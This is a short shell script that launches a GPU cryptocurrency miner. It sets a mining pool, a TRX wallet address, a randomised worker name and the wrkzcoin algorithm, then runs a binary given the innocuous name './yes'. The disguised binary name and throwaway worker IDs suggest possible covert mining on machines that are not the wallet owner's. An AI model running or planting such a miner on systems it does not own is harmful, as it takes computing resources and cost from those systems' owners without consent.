POOL=rx-us.unmineable.com:3333
WALLET=TRX:TA6KD35q8MrMdjdimxk2ebENZVYCqXJ7he
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo eQ7pBXgu-$(shuf -i 1914-949369 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
